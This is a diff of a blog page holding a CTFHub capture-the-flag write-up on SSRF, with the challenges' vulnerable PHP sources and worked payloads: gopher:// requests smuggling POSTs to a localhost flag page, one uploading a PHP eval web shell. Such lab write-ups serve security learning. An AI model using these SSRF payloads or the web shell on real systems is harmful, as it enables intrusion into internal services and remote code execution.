@@ -183,7 +183,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/SSRF" style=color:#00bcd4>
+                <a href="/tags/SSRF" style=color:#879cff>
                     SSRF
                 </a>
             </span>
@@ -193,7 +193,8 @@
     </div>
 
     <div class="content" v-pre>
-        <p>写的很随意的一点wp</p>
+        <br>
+
 <span id="more"></span>
 
 <h3 id="CTFHub-SSRF-内网访问"><a href="#CTFHub-SSRF-内网访问" class="headerlink" title="CTFHub-SSRF-内网访问"></a>CTFHub-SSRF-内网访问</h3><blockquote>
@@ -231,19 +232,18 @@
 <li><p>POST传参url=127.0.0.1得到一个key：914af5faca0f9e1b81bc650d0537884e</p>
 </li>
 <li><p>继续探索，post传一个伪协议得到一段源码（flag.php）：</p>
-</li>
-<li><pre><code class="php">&lt;?php
-    
+<pre><code class="php">&lt;?php
+
 error_reporting(0);
-    
+
 if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
     echo &quot;Just View From 127.0.0.1&quot;;
     return;
 &#125;
-    
+
 $flag=getenv(&quot;CTFHUB&quot;);
 $key = md5($flag);
-    
+
 if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
     echo $flag;
     exit;
@@ -260,16 +260,15 @@ if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &
 <p>——————-分割线—————–</p>
 <ul>
 <li><p>index.php被302跳转了，看一下它的源码：</p>
-</li>
-<li><pre><code class="php">&lt;?php
-    
+<pre><code class="php">&lt;?php
+
 error_reporting(0);
-    
+
 if (!isset($_REQUEST[&#39;url&#39;]))&#123;
     header(&quot;Location: /?url=_&quot;);
     exit;
 &#125;
-    
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -281,16 +280,13 @@ curl_close($ch);
 <li><p>用了curl函数来获取并且输出数据，curl可以支持的伪协议有很多,gopher,file,dict,http/s</p>
 </li>
 <li><p>要求传入一个url，不限制请求方式，因此可以通过gopher协议，向flag.php传一个post报文：</p>
-<ul>
-<li><pre><code class="http">POST /flag.php HTTP/1.1
+<pre><code class="php">POST /flag.php HTTP/1.1
 Host: 127.0.0.1:80
 Content-Length: 36
 Content-Type: application/x-www-form-urlencoded
-    
+
 key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 </code></pre>
-</li>
-</ul>
 </li>
 <li><p>报文内容显示在url上输入，被解码后保存到curl里面，再通过curl输出跳转，又解码了一次，所以要对POST报文内容进行两次url编码</p>
 </li>
@@ -305,14 +301,13 @@ key=51457bb0a50c1eb2c92dcc3ec3c2cc13
 <li><p>试着读一下源码，很遗憾，什么都没有读到，上御剑</p>
 </li>
 <li><p>很遗憾，伪协议敲错了，读到flag.php：</p>
-</li>
-<li><pre><code class="php">error_reporting(0);
-    
+<pre><code class="php">error_reporting(0);
+
 if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;
     echo &quot;Just View From 127.0.0.1&quot;;
     return;
 &#125;
-    
+
 if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;
     echo getenv(&quot;CTFHUB&quot;);
     exit;
@@ -324,8 +319,7 @@ if(isset($_FILES[&quot;file&quot;]) &amp;&amp; $_FILES[&quot;file&quot;][&quot;s
 <li><p>先上传个文件抓个包（离谱的是的是，网页本身没有提交文件的按钮，f12自己加一个：<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code>）</p>
 </li>
 <li><p>请求信息全部复制下来，两次url编码，记得把%0A换成%0D%0A，然后上一题的套路，直接gopher协议传进去，得到flag</p>
-</li>
-<li><pre><code class="http">?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A102.0)%2520Gecko%252F20100101%2520Firefox%252F102.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------89800895834957885263732665617%250D%250AContent-Length%253A%2520403%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%252F%253Furl%253Dfile%253A%252F%252F%252Fvar%252Fwww%252Fhtml%252Fflag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25222.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520phpinfo()%253B%2520%2540eval(%2524_POST%255B&#39;haoye&#39;%255D)%253B%2520%253F%253E%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------89800895834957885263732665617--
+<pre><code class="http">?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A102.0)%2520Gecko%252F20100101%2520Firefox%252F102.0%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------89800895834957885263732665617%250D%250AContent-Length%253A%2520403%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-7e9b3eb463ae9fc4.sandbox.ctfhub.com%253A10800%252F%253Furl%253Dfile%253A%252F%252F%252Fvar%252Fwww%252Fhtml%252Fflag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25222.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520phpinfo()%253B%2520%2540eval(%2524_POST%255B&#39;haoye&#39;%255D)%253B%2520%253F%253E%250D%250A-----------------------------89800895834957885263732665617%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------89800895834957885263732665617--
 </code></pre>
 </li>
 </ul>
